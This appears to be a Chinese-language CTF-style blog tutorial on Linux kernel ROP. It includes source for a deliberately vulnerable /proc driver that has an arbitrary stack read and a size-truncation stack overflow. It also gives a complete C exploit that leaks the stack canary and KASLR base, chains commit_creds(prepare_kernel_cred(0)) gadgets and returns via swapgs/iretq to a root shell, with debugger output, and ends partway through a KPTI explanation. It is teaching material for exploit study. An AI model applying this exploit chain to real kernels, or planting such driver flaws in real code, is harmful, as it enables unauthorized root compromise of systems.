---
layout: post
title: 【pwn4kernel】Kernel ROP技术分析
categories: pwn4kernel
description: 深入解析 Kernel Technique
keywords: CTF, pwn4kernel, Kernel-Exploit
---

# 【pwn4kernel】Kernel ROP技术分析

## 1. 测试环境

**测试版本**：Linux-4.15.8 [内核镜像地址](https://github.com/BinRacer/pwn4kernel/blob/master/kernels/4.15.8/01/bzImage)

笔者测试的内核版本是 `Linux (none) 4.15.8 #1 SMP Sat Dec 27 16:56:38 CST 2025 x86_64 GNU/Linux`。

**编译选项**：关闭`CONFIG_SLAB_FREELIST_RANDOM` 、`CONFIG_SLAB_FREELIST_HARDENED`、`CONFIG_MEMCG`和`CONFIG_HARDENED_USERCOPY`选项。开启`CONFIG_BINFMT_MISC`、`CONFIG_E1000`、`CONFIG_E1000E`选项。完整配置参考[.config](https://github.com/BinRacer/pwn4kernel/blob/master/kernels/4.15.8/01/.config)。

**保护机制**：KASLR

**测试驱动程序**：笔者基于**QWB2018 core**编写了一个辅助测试用的内核驱动，该驱动以内核模块形式加载，并通过创建 /proc接口与用户态测试程序进行通信，是完成整个漏洞利用链的关键组件之一。

驱动源码如下：

```c
/**
 * Copyright (c) 2025 BinRacer <native.lab@outlook.com>
 *
 * This work is licensed under the terms of the GNU GPL, version 2 or later.
**/
// code base on QWB2018 core
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/types.h>

#define CORE_WRITE 0x6677889a
#define CORE_READ 0x6677889b
#define CORE_SET 0x6677889c

static char name[0x800];
static void *off;
static struct proc_dir_entry *core_proc;

static long core_copy_func(long size);
static long core_read(void *target);
static ssize_t core_write(struct file *file, const char __user * buf,
			  size_t size, loff_t * ppos);
static long core_ioctl(struct file *file, unsigned int cmd, unsigned long arg);
static int core_release(struct inode *inode, struct file *file);
static struct file_operations core_fops = {
	.owner = THIS_MODULE,
	.write = core_write,
	.unlocked_ioctl = core_ioctl,
	.release = core_release,
};

static __init int init_core(void)
{
	core_proc = proc_create("core", 0666, NULL, &core_fops);
	if (IS_ERR(core_proc)) {
		return PTR_ERR(core_proc);
	}
	pr_info("[core:] create /proc/core entry!\n");
	return 0;
}

static __exit void exit_core(void)
{
	if (core_proc) {
		remove_proc_entry("core", core_proc);
	}
	pr_info("[core:] destroy /proc/core entry!\n");
}

static ssize_t core_write(struct file *file, const char __user *buf,
			  size_t size, loff_t *ppos)
{
	pr_info("[core:] core_write called!\n");
	if (size <= 0x800 && !copy_from_user(name, buf, size)) {
		return size;
	}
	pr_info("[core:] error copying data from userspace!\n");
	return -EFAULT;
}

static long core_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
	long result = 0;
	switch (cmd) {
	case CORE_WRITE:
		{
			pr_info("[core:] core_write called!\n");
			result = core_copy_func((long)arg);
			break;
		}
	case CORE_READ:
		{
			pr_info("[core:] core_read called!\n");
			result = core_read((void *)arg);
			break;
		}
	case CORE_SET:
		{
			pr_info("[core:] core: %lu", arg);
			off = (void *)arg;
			break;
		}
	default:
		break;
	}
	return result;
}

static int core_release(struct inode *inode, struct file *file)
{
	pr_info("[core:] core_release called!\n");
	return 0;
}

static long core_copy_func(long size)
{
	char buf[0x40];
	pr_info("[core:] core_write called!\n");
	if (size > 0x3f) {
		pr_info("[core:] Detect Overflow!\n");
		return -EPERM;
	}
	memcpy(buf, name, (u16) size);
	return 0;
}

static long core_read(void *target)
{
	char buf[0x40];
	pr_info("[core:] core_read called!\n");
	pr_info("[core:] read %lu %p\n", (unsigned long)off, target);
	memset(buf, 0, 0x40);
	strcpy(buf, "Welcome to the pwn4kernel challenge!\n");
	if (copy_to_user
	    ((char *)target, (char *)&buf[(unsigned long)off], 0x40)) {
		__asm__ __volatile__("swapgs":::"memory");
	}
	return 0;
}

module_init(init_core);
module_exit(exit_core);
MODULE_AUTHOR("BinRacer");
MODULE_LICENSE("GPL v2");
```

## 2. 漏洞描述

在该内核模块中，存在两处可被串联利用的关键漏洞，共同构成一个完整的本地权限提升利用链。

### 2-1. 漏洞一

此漏洞为核心的信息泄露原语。模块提供了一个功能，允许用户态程序通过特定的操作命令指定一个偏移量`off`，随后读取内核内存中位于`内核栈buf + off`处的数据。由于对用户控制的`off`变量缺乏任何边界或有效性校验，可以将其设置为任意值，从而指向内核地址空间中的任意目标地址。

**利用此漏洞，可以实现：**

1.  **泄露内核基地址**：通过读取内核代码或数据段中已知的、含有固定偏移的指针（如`ops`结构体指针、全局函数指针），计算出内核镜像的加载基址，从而绕过KASLR保护。
2.  **泄露栈Canary**：通过将`off`指向内核线程栈上存储canary值的位置，获取当前栈的守护值。这是成功利用栈溢出漏洞的关键前提。
3.  **泄露其他敏感数据**：根据利用需要，可以进一步泄露出其他有用的地址或数据，例如`modprobe_path`、`core_pattern`等全局变量的地址，或特定结构体的内容，为后续利用步骤提供信息。

### 2-2. 漏洞二

此漏洞为最终的控制流劫持原语，位于`core_copy_func`函数中。该函数的签名包含一个`long`类型的`size`参数，但在函数内部进行实际的数据拷贝前，存在一个关键的安全缺陷：

1.  **不一致的类型与检查**：函数首先会检查传入的`long size`参数是否大于某个阈值（例如`0x3f`）。如果检查通过，则继续执行。
2.  **危险的类型转换**：随后，函数在准备调用如`copy_from_user`等拷贝函数时，将`long`类型的`size`参数强制转换（或赋值）给一个`uint16_t`（16位无符号整数）类型的局部变量。当原始的`size`值大于`0xffff`（`uint16_t`的最大值）时，此转换将产生 **截断**，仅保留`size`的低16位。
3.  **被绕过的检查**：关键在于，此前的长度检查是针对原始的、未截断的`long size`进行的。可以传入一个精心构造的`size`值（例如`0xffffffff`），它虽然远大于`0x3f`，能通过`if (size > 0x3f)`检查，但在转换为`uint16_t`时，其值被截断为`0xffff`。
4.  **过量的数据拷贝**：最终，底层的不安全拷贝函数（如`copy_from_user`）接收到的是这个被截断后的`uint16_t`值（`0xffff`）作为拷贝长度。此长度虽然绕过了之前的检查，但仍**远远超过**目标内核栈缓冲区的实际大小，导致栈缓冲区被大量可控的数据覆盖。

**利用此漏洞，可以实现：**

1.  **覆盖内核栈数据**：向目标栈缓冲区写入最多`0xffff`字节的受控数据，远超缓冲区本身的容量。
2.  **精准覆盖返回地址**：在泄露了栈Canary和内核基址的基础上，可以在溢出数据中正确放置获取到的Canary值以通过检查，然后覆盖保存在栈上的函数返回地址。
3.  **劫持控制流**：将返回地址覆盖为指向内核ROP链或特定gadget的地址，从而完全掌控内核的执行流程，最终实现权限提升至root。

### 2-3. 利用链串联

典型的利用路径为：首先利用**漏洞一**多次读取内核内存，泄露出**栈Canary**和**内核基址**。然后利用**漏洞二**构造栈溢出数据，其中精心布置了正确的Canary、ROP链载荷，并将返回地址指向可控的ROP链起始点。当存在漏洞的函数返回时，内核将执行精心设置的ROP链代码，完成权限提升。

## 3. Kernel ROP 概述

Kernel ROP（面向内核的返回导向编程）是内核漏洞利用中一项关键技术，其核心思想与用户态ROP一致：通过控制内核栈上的返回地址，将内核执行流导向一系列以`ret`指令结尾的现有代码片段，并按序执行这些片段来完成精心设置的目标。然而，内核ROP面临比用户态更复杂的执行环境，其布局与目标有显著区别，主要体现在以下三个方面：

### 3-1. 用户态与内核态区别

用户态ROP的最终目标通常是执行任意代码（如调用`system(“/bin/sh”)`）。内核ROP的主要目标则是**将当前进程的权限提升至最高（通常是root）**，并**安全地将执行上下文从内核态切换回用户态**。这是因为内核漏洞触发点位于内核空间，要控制的初始执行流也在内核中。如果在内核ROP链执行完毕后，简单地通过`ret`指令返回到一个用户态的shellcode地址，处理器会因为权限级别（CPL）未正确切换而导致通用保护故障（GPF）。因此，一个完整的内核ROP利用必须包含“状态恢复”环节。

### 3-2. 内核态利用链布局

一个典型的内核ROP利用链由两部分顺序执行的功能链构成：

- **第一部分：权限提升链**
  这部分链的唯一目的是修改当前进程的凭据。最常见的手法是顺序调用两个内核导出函数（或通过ROP模拟其调用）：
    1.  `prepare_kernel_cred(0)`： 该函数创建一个具有root权限的全新凭据结构体，参数`0`通常表示引用空凭据。
    2.  `commit_creds(prepare_kernel_cred(0))`： 该函数将上一步创建的root凭据应用到当前进程。执行成功后，当前进程在内核视角即已成为root进程。
- **第二部分：状态恢复与返回用户空间链**
  在权限提升后，必须安全地退出内核并返回到一个用户空间的控制点。这需要一系列Gadget来完成：
    1.  **恢复被破坏的栈/寄存器**：溢出可能破坏栈的后续内容，需要恢复`RSP`等关键寄存器至稳定状态。
    2.  **切换GS/KERNEL_GS**： 通过`swapgs`指令切换至用户态的GS段，以正确访问用户空间数据。
    3.  **执行内核退出例程**： 最可靠的方式是复用内核自身的退出路径。这通常通过构造一个栈帧，模仿异常/中断返回，然后执行`iretq`（或`sysretq`）指令。`iretq`会从栈上依次弹出`RIP`、`CS`、`RFLAGS`、`RSP`、`SS`，从而将处理器切换回用户模式并跳转到用户态指定的地址（如一个启动shell的普通函数）。

### 3-3. 保护机制的差异与绕过

内核拥有与用户态相似的缓解措施，但具体实现和绕过上下文有所不同：

- **KASLR（内核地址空间布局随机化）**： 类似于用户态的ASLR。**绕过方式**与利用漏洞一（任意地址读）完全对应：通过信息泄露漏洞获取一个内核指针，计算出内核`.text`段的基址，从而得到所有Gadget和函数的实际地址。
- **Stack Canary**： 与用户态原理相同。**绕过方式**直接对应漏洞一的第二个用途：在实施栈溢出（漏洞二）之前，必须先利用任意读漏洞泄露出当前栈帧的Canary值，并在构造溢出数据时，在原位置正确填入该值，以通过`__stack_chk_fail`检查。

## 4. 实战演练

exploit核心代码如下：

```c
size_t kernel_base = 0xffffffff81000000, kernel_offset = 0;
size_t user_cs, user_ss, user_rflags, user_sp;

void save_status() {
  asm volatile("mov user_cs, cs;"
               "mov user_ss, ss;"
               "mov user_sp, rsp;"
               "pushf;"
               "pop user_rflags;");
  log.info("Status has been saved.");
}

void get_root_shell(void) {
  if (getuid()) {
    log.error("Failed to get the root!");
    exit(-1);
  }

  log.success("Successful to get the root. Execve root shell now...");
  system("/bin/sh");
}

void core_read(int fd, char *buf) { ioctl(fd, 0x6677889B, buf); }

void set_off(int fd, int value) { ioctl(fd, 0x6677889C, value); }

void core_copy_func(int fd, size_t size) { ioctl(fd, 0x6677889A, size); }

#define COMMIT_CREDS 0xffffffff8107fc40
#define PREPARE_KERNEL_CRED 0xffffffff8107ff10
#define POP_RDI_RET 0xffffffff813b65dc
#define POP_RCX_RET 0xffffffff8103b603
#define POP_RSI_RET 0xffffffff8127ddfe
#define CMP_RCX_RSI_MOV_RDI_RAX_POP_RBP_RET 0xffffffff8139908b
#define SWAPGS_POPFQ_POP_RBP_RET 0xffffffff81c0147e
#define IRETQ 0xffffffff81010c47

int main() {
  FILE *fd_kallsyms = NULL;
  size_t addr = 0, offset = 0;
  char type[0x10], func[0x50];
  char buf[0x100];
  size_t canary = 0;
  int fd = -1;
  int i = 0;
  size_t rop_chain[0x100];

  log.info("Start to exploit...");
  save_status();

  fd = open("/proc/core", O_RDWR);
  if (fd < 0) {
    log.error("Failed to open /proc/core.");
    exit(0);
  }

  set_off(fd, 0x80);
  core_read(fd, buf);
  kernel_offset = ((size_t *)buf)[0] - 0xffffffff812237ed;
  kernel_base += kernel_offset;
  log.success("leak kernel addr: 0x%lx", ((size_t *)buf)[0]);
  log.success("kernel base: 0x%lx", kernel_base);
  log.success("kernel offset: 0x%lx", kernel_offset);

  set_off(fd, 0x40);
  core_read(fd, buf);
  canary = ((size_t *)buf)[0];
  log.success("leak canary: 0x%lx", canary);

  for (i = 0; i < 10; i++) {
    rop_chain[i] = canary;
  }

  // commit_creds(prepare_kernel_cred(NULL));
  rop_chain[i++] = kernel_offset + POP_RDI_RET;
  rop_chain[i++] = 0;
  rop_chain[i++] = kernel_offset + PREPARE_KERNEL_CRED;
  rop_chain[i++] = kernel_offset + POP_RCX_RET;
  rop_chain[i++] = 0;
  rop_chain[i++] = kernel_offset + POP_RSI_RET;
  rop_chain[i++] = 0;
  rop_chain[i++] = kernel_offset + CMP_RCX_RSI_MOV_RDI_RAX_POP_RBP_RET;
  rop_chain[i++] = 0;
  rop_chain[i++] = kernel_offset + COMMIT_CREDS;
  rop_chain[i++] = kernel_offset + SWAPGS_POPFQ_POP_RBP_RET;
  rop_chain[i++] = 0;
  rop_chain[i++] = 0;
  rop_chain[i++] = kernel_offset + IRETQ;
  rop_chain[i++] = (size_t)get_root_shell;
  rop_chain[i++] = user_cs;
  rop_chain[i++] = user_rflags;
  rop_chain[i++] = user_sp + 8;
  rop_chain[i++] = user_ss;

  write(fd, rop_chain, 0x800);

  core_copy_func(fd, (0xffffffffffff0000 | 0x100));
  return 0;
}
```

### 4-1. 保存关键寄存器

在内核ROP利用中，为确保在执行完内核空间的权限提升代码后能够平稳、正确地切换回用户态，必须事先保存用户态的关键上下文寄存器值。这些值包括：`user_cs`（代码段选择子）、`user_ss`（栈段选择子）、`user_sp`（栈指针）、`user_rflags`（标志寄存器）以及`user_rip`（指令指针）。保存这些值是为后续通过`iretq`指令返回用户态做必要准备。

**为什么必须保存这些值？**  
当CPU从用户态陷入内核态（如通过系统调用、中断或异常）时，会自动将用户态的`CS`、`RIP`、`RFLAGS`、`SS`、`RSP`等寄存器值压入内核栈，以保存现场。然而，内核漏洞利用过程中的栈溢出往往会破坏这些保存值，因此需在触发漏洞前， **主动在用户空间备份这些寄存器**，以便在构造ROP链时能手动恢复它们。`iretq`指令是内核退出到用户态的标准路径，它会从栈中依次弹出`RIP`、`CS`、`RFLAGS`、`RSP`、`SS`，从而恢复用户态执行流。若这些值缺失或错误，将导致CPU触发通用保护故障（GPF）或系统崩溃，使得利用失败。

**如何保存这些值？**  
在用户态的利用载荷（exploit）中，通常通过内联汇编直接读取这些寄存器的当前值，并存储到全局变量中，ATT版本代码如下：

```c
uint64_t user_cs, user_ss, user_rflags, user_sp;

void save_status() {
  __asm__ volatile("mov %%cs, %0\n\t"
                   "mov %%ss, %1\n\t"
                   "movq %%rsp, %2\n\t"
                   "pushfq\n\t"
                   "popq %3"
                   : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp),
                     "=r"(user_rflags)
                   :
                   : "memory", "cc");
}
```

Intel 版本代码如下：

```c
void save_status() {
  __asm__ volatile("mov %0, cs\n\t"
                   "mov %1, ss\n\t"
                   "mov %2, rsp\n\t"
                   "pushfq\n\t"
                   "pop %3"
                   : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp),
                     "=r"(user_rflags)
                   :
                   : "memory", "cc");
}
```

其中：

- `user_cs`和`user_ss`分别为用户态代码段和栈段的选择子，在64位Linux中通常固定为`0x33`和`0x2b`，但为兼容性仍动态获取。
- `user_sp`是当前用户栈指针，确保返回后栈位置正确。
- `user_rflags`保存了标志位（如中断使能位），需原样恢复以避免行为异常。
- `user_rip`需设置为返回用户态后要执行的函数地址（如启动shell的代码）。

### 4-2. 泄露内核地址

在漏洞利用过程中，通过分析泄露的栈缓冲区（`buf`）内容，可以清晰地观察到内核栈的布局，并从中提取出后续利用所必需的两类关键信息。

首先，在泄露的数据中，特定位置存放着内核代码指针，例如地址 **`0xffffffff812237ed`**。这个地址是内核中某个函数或指令的真实运行时地址，它与内核镜像的加载基址之间存在**固定的偏移关系**。可以利用这个关系计算出内核基址。具体方法是：用泄露出的地址（如`0xffffffff812237ed`）减去该地址在原始内核符号中的已知偏移，即可得到内核的运行时基址。一旦基址确定，所有其他内核符号的地址便可随之计算出来。例如，可以准确得到 **`commit_creds`** 和 **`prepare_kernel_cred`** 函数的真实地址，并进一步定位到构建ROP链所需的各种**gadgets**的地址，从而为控制流劫持铺平道路。

其次，在栈布局中，栈守护值（**canary**）就存储在缓冲区的附近。通过分析栈结构确定其偏移，可以将其直接从泄露数据中读取出来，例如获取到canary值 **`0x802815371b247200`**。成功获取此值是整个利用链的关键前提，它使得后续的栈溢出利用能够在不触发栈保护检查（`__stack_chk_fail`）的情况下，安全地覆盖栈上的返回地址，最终实现稳定的控制流劫持。

```bash
In file: /home/bogon/workSpaces/pwn4kernel/src/ROP/drivers/binary.c:115
   109
   110 static long core_read(void *target)
   111 {
   112         char buf[0x40];
   113         pr_info("[core:] core_read called!\n");
   114         pr_info("[core:] read %lu %p\n", (unsigned long)off, target);
 ► 115         memset(buf, 0, 0x40);
   116         strcpy(buf, "Welcome to the pwn4kernel challenge!\n");
   117         if (copy_to_user
   118             ((char *)target, (char *)&buf[(unsigned long)off], 0x40)) {
   119                 __asm__ __volatile__("swapgs":::"memory");
   120         }
   121         return 0;
   122 }

pwndbg> p/x &buf
$1 = 0xffffc90000647dc8
pwndbg> telescope 0xffffc90000647dc8 18
00:0000│ rax rdi 0xffffc90000647dc8 —▸ 0xffffc90000647dd8 ◂— 0x100070001
01:0008│-040     0xffffc90000647dd0 ◂— 0x802815371b247200
02:0010│-038     0xffffc90000647dd8 ◂— 0x100070001
03:0018│-030     0xffffc90000647de0 ◂— 0x6677889b
04:0020│-028     0xffffc90000647de8 —▸ 0x7ffcf99f2060 ◂— 0
05:0028│-020     0xffffc90000647df0 ◂— 0
06:0030│-018     0xffffc90000647df8 —▸ 0xffff880004c848b4 ◂— 1
07:0038│-010     0xffffc90000647e00 ◂— 1
08:0040│-008     0xffffc90000647e08 ◂— 0x802815371b247200
09:0048│ rbp     0xffffc90000647e10 —▸ 0xffffc90000647e40 —▸ 0xffffc90000647e60 —▸ 0xffffc90000647ee8 —▸ 0xffffc90000647f28 ◂— ...
0a:0050│+008     0xffffc90000647e18 —▸ 0xffffffffc0000203 (core_ioctl+107) ◂— mov qword ptr [rbp - 8], rax
0b:0058│+010     0xffffc90000647e20 —▸ 0x7ffcf99f2060 ◂— 0
0c:0060│+018     0xffffc90000647e28 ◂— 0x6677889b076e2e00
0d:0068│+020     0xffffc90000647e30 —▸ 0xffff8800076e2e00 ◂— 0
0e:0070│+028     0xffffc90000647e38 ◂— 0
0f:0078│+030     0xffffc90000647e40 —▸ 0xffffc90000647e60 —▸ 0xffffc90000647ee8 —▸ 0xffffc90000647f28 —▸ 0xffffc90000647f48 ◂— ...
10:0080│+038     0xffffc90000647e48 —▸ 0xffffffff812237ed ◂— mov r12, rax
11:0088│+040     0xffffc90000647e50 —▸ 0xffff88000482c800 ◂— 0x581b6
pwndbg>
```

可以观察到栈上关键数据与缓冲区`buf`起始地址之间的精确偏移关系：

- **canary 位置**：栈守护值 `0x802815371b247200` 的地址为 `0xffffc90000647e08`。其相对于`buf`起始地址 (`0xffffc90000647dc8`) 的偏移为 `0xffffc90000647e08 - 0xffffc90000647dc8 = 0x40`。
- **内核地址位置**：内核代码指针 `0xffffffff812237ed` 的地址为 `0xffffc90000647e48`。其相对于`buf`起始地址的偏移为 `0xffffc90000647e48 - 0xffffc90000647dc8 = 0x80`。

基于此，通过控制全局变量`off`的漏洞，利用以下步骤精确读取这两项关键数据：

1.  **泄露栈Canary**：
    - 首先，通过`ioctl`的`CORE_SET`命令，将全局变量`off`的值设置为`0x40`。
    - 随后，调用`ioctl`的`CORE_READ`命令。由于`off`指向了canary所在的偏移，该命令会将内核地址 `buf + off`（即`0xffffc90000647dc8 + 0x40 = 0xffffc90000647e08`）处的内容（也就是canary值）读取并返回给用户空间。

2.  **泄露内核指针以计算基址**：
    - 接下来，再次通过`CORE_SET`命令，将`off`的值设置为`0x80`。
    - 然后，调用`CORE_READ`命令。此时，命令会读取内核地址 `buf + off`（即`0xffffc90000647dc8 + 0x80 = 0xffffc90000647e48`）处的内容，从而泄露那个内核代码指针 `0xffffffff812237ed`。

通过这两次精确的读取操作，成功获取了绕过栈保护（Canary）和内核地址随机化（KASLR）所必需的关键信息，为后续的栈溢出与控制流劫持铺平了道路。

### 4-3. 构造ROP利用链

在内核栈溢出利用中，为了实现稳定的权限提升并安全返回用户态，需要对溢出数据进行精密的布局。整个布局从被覆盖的缓冲区末尾开始，向高地址方向依次构造，其顺序与作用如下：

**栈布局示意图（低地址 -> 高地址）**

以下是经过美化的栈布局图，边框已对齐，结构清晰：

```
[低地址]
+--------------------------------+------------------------------------+
|  溢出填充数据 (A)              | // 填充至恰好覆盖到canary之前      |
+--------------------------------+------------------------------------+
|  正确的Canary值                | // 偏移0x40处，用于绕过栈保护检查  |
+--------------------------------+------------------------------------+
|  伪造的RBP值                   | // 可设置为稳定地址或无需关心      |
+--------------------------------+------------------------------------+
|  Fake RIP (起始地址)           | // 控制流劫持点，指向首个ROP gadget|
+--------------------------------+------------------------------------+
|  --- ROP链开始 ---             |                                    |
+--------------------------------+------------------------------------+
|  gadget: pop rdi; ret          | // 设置第一个参数，例如 rdi = 0    |
|  value: 0                      |                                    |
+--------------------------------+------------------------------------+
|  prepare_kernel_cred           | // 调用函数，返回凭证指针在RAX     |
+--------------------------------+------------------------------------+
|  gadget: mov rdi, rax; ret     | // 将返回值移动到RDI，作为参数     |
+--------------------------------+------------------------------------+
|  commit_creds                  | // 应用凭证，提升当前进程权限      |
+--------------------------------+------------------------------------+
|  gadget: swapgs; ret           | // 切换GS段，准备返回用户态        |
+--------------------------------+------------------------------------+
|  gadget: iretq                 | // 或 pop rXX; iretq 组合          |
+--------------------------------+------------------------------------+
|  --- IRET帧开始 (由iretq指令弹出) ---                               |
+--------------------------------+------------------------------------+
|  user_rip (返回地址)           | // 指向用户空间的shellcode或函数   |
+--------------------------------+------------------------------------+
|  user_cs                       | // 用户态代码段选择子              |
+--------------------------------+------------------------------------+
|  user_rflags                   | // 恢复标志寄存器                  |
+--------------------------------+------------------------------------+
|  user_sp                       | // 用户态栈指针                    |
+--------------------------------+------------------------------------+
|  user_ss                       | // 用户态栈段选择子                |
+--------------------------------+------------------------------------+
[高地址]
```

#### 4-3-1. 布局详解

1.  **溢出填充、Canary 与栈帧基础 (0x40 - 0x58)**
    - **填充数据**：首先用任意数据（如`‘A’*0x40`）填满原始缓冲区，直至恰好到达**Canary**在栈上的位置（偏移`0x40`）。
    - **正确的Canary**：在偏移`0x40`处，必须**原封不动地写入**之前通过漏洞泄露出的真实Canary值（如`0x802815371b247200`）。这是绕过`__stack_chk_fail`检测、使程序继续执行的关键。
    - **伪造的RBP**：在Canary之后的高地址方向（通常是偏移`0x48`），是保存的`RBP`值。此处可覆盖为一个稳定的内核地址（或无需关心），以防止潜在的栈帧遍历错误。

2.  **控制流劫持与ROP链起点 (0x50)**
    - **Fake RIP (返回地址)**：在`RBP`之后的高地址方向（偏移`0x50`），是函数的返回地址保存位置。此处被覆盖为**第一个ROP gadget的地址**，成为控制流劫持的起点。当存在漏洞的函数执行`ret`指令时，将跳转到此地址开始执行ROP链。

3.  **权限提升ROP链 (核心逻辑)**
    - **目标**：以`fake rip`为起点，通过连续`ret`指令串联gadget，模拟`commit_creds(prepare_kernel_cred(0))`的调用。
    - **具体步骤**：
        1.  **设置参数**：通过`pop rdi; ret` gadget将`RDI`寄存器置`0`（`NULL`）。
        2.  **调用`prepare_kernel_cred(0)`**：跳转到该函数地址。执行后，返回值（新凭证结构指针）存放在`RAX`中。
        3.  **传递参数**：通过`mov rdi, rax; ret`（或类似功能）gadget，将`RAX`中的指针移动到`RDI`，作为`commit_creds`的参数。
        4.  **调用`commit_creds`**：跳转到该函数地址，将root凭证应用于当前进程。

4.  **状态恢复与返回用户态**
    - **切换GS**：执行`swapgs; ret` gadget，将GS寄存器切换回用户态值，以正确处理KPTI等机制。
    - **构造IRET帧并返回**：最后跳转到一个`iretq` gadget（或`pop rXX; iretq`）。 **`iretq`指令会连续从栈顶弹出5个值**，因此必须在其地址之后，按顺序布置完整的“IRET帧”：
        -  **user_rip**: 用户空间指令指针，指向获取shell的代码。
        -  **user_cs**: 用户态代码段选择子。
        -  **user_rflags**: 用户态标志寄存器。
        -  **user_sp**: 用户态栈指针。
        -  **user_ss**: 用户态栈段选择子。

#### 4-3-2. 执行流程总结

当函数返回时，其控制流将按以下顺序进行：

1.  检查Canary通过 → 弹出伪造的`RBP` → 跳转到`fake rip`（第一个gadget）。
2.  依次执行ROP链：设置参数 → 调用`prepare_kernel_cred` → 移动返回值 → 调用`commit_creds` → 执行`swapgs`。
3.  执行`iretq`，该指令依次将`user_rip`、`user_cs`、`user_rflags`、`user_sp`、`user_ss`弹出到相应寄存器，并完成从内核态到用户态的特权级切换，最终跳转到`user_rip`指向的用户空间代码执行，从而获得一个root权限的shell。

本exploit.c布局如下：

```c
  for (i = 0; i < 10; i++) {
    rop_chain[i] = canary;
  }

  // commit_creds(prepare_kernel_cred(NULL));
  rop_chain[i++] = kernel_offset + POP_RDI_RET;
  rop_chain[i++] = 0;
  rop_chain[i++] = kernel_offset + PREPARE_KERNEL_CRED;
  rop_chain[i++] = kernel_offset + POP_RCX_RET;
  rop_chain[i++] = 0;
  rop_chain[i++] = kernel_offset + POP_RSI_RET;
  rop_chain[i++] = 0;
  rop_chain[i++] = kernel_offset + CMP_RCX_RSI_MOV_RDI_RAX_POP_RBP_RET;
  rop_chain[i++] = 0;
  rop_chain[i++] = kernel_offset + COMMIT_CREDS;
  rop_chain[i++] = kernel_offset + SWAPGS_POPFQ_POP_RBP_RET;
  rop_chain[i++] = 0;
  rop_chain[i++] = 0;
  rop_chain[i++] = kernel_offset + IRETQ;
  rop_chain[i++] = (size_t)get_root_shell;
  rop_chain[i++] = user_cs;
  rop_chain[i++] = user_rflags;
  rop_chain[i++] = user_sp + 8;
  rop_chain[i++] = user_ss;
```

### 4-4. 触发利用

在完成ROP链的精心构造后，利用进入最终的触发与执行阶段。利用模块提供的合法操作接口，可以稳定地将利用载荷送入内核并触发漏洞，从而完成权限提升。整个流程环环相扣，具体步骤如下：

#### 4-4-1. 准备与写入利用载荷

首先，在用户空间将构建好的完整ROP链（包含正确的Canary、伪造的返回地址、权限提升链及IRET帧）放入一个缓冲区。随后，通过`write(fd, payload, payload_size)`系统调用，将这份利用载荷写入内核模块的**全局数组`name`**中。`name`数组是模块设计的一个数据缓冲区，`write`操作是模块预期提供的、用于接收用户输入的正常功能。这一步的目的是在内核空间准备一个完全可控的“弹药库”。

#### 4-4-2. 触发漏洞与栈溢出

紧接着，通过`ioctl`发送`CORE_WRITE`命令。该命令会调用存在漏洞的`core_copy_func`函数。通过参数精心控制，使得函数内部将一个`long`型的大尺寸（例如`0x10000`）截断为`uint16_t`类型的`0xffff`。函数执行时，会从全局数组`name`中，向栈上的局部缓冲区`buf`复制**最多`0xffff`字节**的数据。由于`buf`的实际大小远小于此，导致了严重的栈缓冲区溢出。

#### 4-4-3. 精准覆盖与控制流劫持

溢出的数据来源于我们上一步写入`name`的ROP链。它精准地覆盖了`buf`之后栈内存中的关键数据：
*   在`buf`之后特定的偏移量（如`0x40`）处，覆盖了栈保护Canary的位置。由于我们填入的是先前泄露的**真实Canary值**，因此成功绕过了栈保护检查。
*   继续向高地址覆盖，在返回地址的位置，原本的函数返回地址被替换为我们ROP链的**起始Gadget地址**。

#### 4-4-4. 执行ROP链与权限获取
当存在漏洞的函数执行到`ret`指令准备返回时，发生了控制流劫持：
*   首先，栈保护机制验证Canary，因为值正确，检查通过。
*   接着，CPU从被覆盖的返回地址处取出指令指针——即ROP链的起点，并开始执行。
*   CPU如同“自动驾驶”一般，依次执行我们布局好的gadget序列：执行`prepare_kernel_cred(0)`创建root凭证，然后通过`commit_creds()`将其应用于当前进程，完成权限提升。随后执行`swapgs`切换上下文，最后通过`iretq`指令弹出一个完整的IRET帧（包含之前保存的`user_cs`、`user_rip`等），安全地返回用户态。

#### 4-4-5. 获得Root Shell

此时，进程已拥有root权限，并且CPU回到了用户空间，跳转到我们预设的`user_rip`地址（例如，一个执行`execve(“/bin/sh”, 0, 0)`的shellcode）。一个具有**root权限的shell**随之被启动，成功完成了本地权限提升。

## 5. 测试结果

nokaslr版本:

<div style="text-align: center; margin: 2rem 0;">
  <img src="/images/posts/KernelExploit/ROP/ROP_001.png"
       style="border-radius: 12px; 
              box-shadow: 0 4px 20px rgba(0,0,0,0.1);
              max-width: 100%;
              height: auto;">
</div>

kaslr版本:

<div style="text-align: center; margin: 2rem 0;">
  <img src="/images/posts/KernelExploit/ROP/ROP_002.png"
       style="border-radius: 12px; 
              box-shadow: 0 4px 20px rgba(0,0,0,0.1);
              max-width: 100%;
              height: auto;">
</div>


## 6. 进阶分析：KPTI原理及其应对

### 6-1. KPTI 原理简介

KPTI 旨在通过**完全隔离**用户空间与内核空间的页表来缓解Meltdown这类侧信道利用。在未启用KPTI的传统系统中，进程的页表同时包含用户空间和内核空间的完整映射。这意味着即使用户态代码无法访问内核数据，但其虚拟地址空间依然包含内核区域，为Meltdown技术利用CPU的乱序执行特性来"窥探"内核内存创造了条件。

引入KPTI后，系统维护**两套独立的页表**，每套页表有不同的映射范围和权限：

1.  **用户态页表**：仅包含用户空间的内存映射。当进程在用户态（`CPL=3`）运行时，CPU使用此页表。此时，内核空间的虚拟地址范围要么完全不存在映射，要么被映射为不可访问，从而在硬件层面阻止了对内核内存的任何访问。

2.  **内核态页表**：包含完整的用户空间和内核空间映射。当进程通过系统调用、中断或异常陷入内核态（`CPL=0`）时，CPU会切换到这套页表，以保证内核能正常访问自身数据和用户数据。

**CR3寄存器切换机制**：
每次在用户态和内核态之间切换时，都需要相应地切换`CR3`寄存器（控制当前页表的寄存器）。这增加了上下文切换的开销，但极大地增强了安全性。

```
传统模式 (无KPTI):
┌─────────────┬────────────────────────────────┐
│   Bits                   │            功能                                                │
├─────────────┼────────────────────────────────┤
│ 63 ... 12                │ 页表基地址 (Page Table Base)                                   │
│ 11 ... 0                 │ 标志位 (Flags)                                                 │
└─────────────┴────────────────────────────────┘

KPTI模式:
┌─────────────┬────────────────────────────────┐
│   Bits                   │            功能                                                │
├─────────────┼────────────────────────────────┤
│ 63 ... 13                │ 页表基地址 (Page Table Base)                                   │
│     12                   │ 页表类型选择 (0=Kernel, 1=User)                                │
